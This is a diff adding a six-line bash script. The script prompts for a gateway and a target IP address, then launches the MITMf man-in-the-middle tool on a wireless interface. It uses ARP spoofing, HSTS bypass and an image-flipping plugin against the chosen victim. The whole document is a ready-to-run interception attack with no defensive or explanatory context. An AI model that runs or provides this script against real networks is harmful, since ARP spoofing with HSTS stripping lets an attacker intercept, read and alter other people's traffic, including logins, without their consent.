@@ -1,0 +1,6 @@
+#!/bin/bash
+echo "Please enter gateway address:"
+read GTW
+echo "Please enter target address:"
+read TGT
+mitmf -i wlan0 --gateway $GTW --arp --spoof --target $TGT -k --hsts --upsidedownternet
